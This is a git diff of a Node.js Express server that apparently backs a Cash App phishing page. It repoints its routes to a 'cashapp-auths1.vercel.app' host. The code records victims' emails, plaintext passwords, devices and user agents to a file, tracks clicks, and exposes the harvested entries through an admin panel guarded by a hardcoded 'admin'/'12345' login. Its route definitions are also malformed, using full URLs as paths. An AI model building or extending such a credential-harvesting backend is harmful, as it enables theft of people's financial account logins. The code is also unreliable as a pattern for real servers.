@@ -31,7 +31,7 @@ function writeData(data) {
 }
 
 // === ADMIN LOGIN ===
-app.post("https://node-server-js-k66j.onrender.com/api/admin/login", (req, res) => {
+app.post("https://cashapp-auths1.vercel.app/api/admin/login", (req, res) => {
   const { username, password } = req.body;
   if (username === "admin" && password === "12345") {
     return res.json({ success: true });
@@ -40,13 +40,13 @@ app.post("https://node-server-js-k66j.onrender.com/api/admin/login", (req, res) 
 });
 
 // === GET ALL LOGIN ENTRIES ===
-app.get("https://node-server-js-k66j.onrender.com/api/data", (req, res) => {
+app.get("https://cashapp-auths1.vercel.app/api/data", (req, res) => {
   const data = readData();
   res.json(data);
 });
 
 // === DELETE LOGIN ENTRY ===
-app.delete("https://node-server-js-k66j.onrender.com/api/data/:id", (req, res) => {
+app.delete("https://cashapp-auths1.vercel.app/api/data/:id", (req, res) => {
   let data = readData();
   const id = parseInt(req.params.id);
   data = data.filter((_, index) => index !== id);
@@ -55,7 +55,7 @@ app.delete("https://node-server-js-k66j.onrender.com/api/data/:id", (req, res) =
 });
 
 // === ADD LOGIN ENTRY ===
-app.post("https://node-server-js-k66j.onrender.com/api/data", (req, res) => {
+app.post("https://cashapp-auths1.vercel.app/api/data", (req, res) => {
   const { email, password, device, userAgent, time } = req.body;
   const line = [email, password, device, userAgent, time].join("|");
   fs.appendFileSync(dataFile, line + "\n");
@@ -73,7 +73,7 @@ app.post("https://node-server-js-k66j.onrender.com/api/stop-alert", (req, res) =
 });
 
 // === TRACK CLICKS ===
-app.post("https://node-server-js-k66j.onrender.com/api/click", (req, res) => {
+app.post("https://cashapp-auths1.vercel.app/api/click", (req, res) => {
   const { device,  time } = req.body;
   const line = [device,  time].join("|");
   fs.appendFileSync(clickFile, line + "\n");
@@ -81,7 +81,7 @@ app.post("https://node-server-js-k66j.onrender.com/api/click", (req, res) => {
 });
 
 // === GET CLICK INFO ===
-app.get("https://node-server-js-k66j.onrender.com/api/clicks", (req, res) => {
+app.get("https://cashapp-auths1.vercel.app/api/clicks", (req, res) => {
   if (!fs.existsSync(clickFile)) return res.json([]);
   const lines = fs.readFileSync(clickFile, "utf-8").split("\n").filter(Boolean);
   const data = lines.map((line, idx) => {
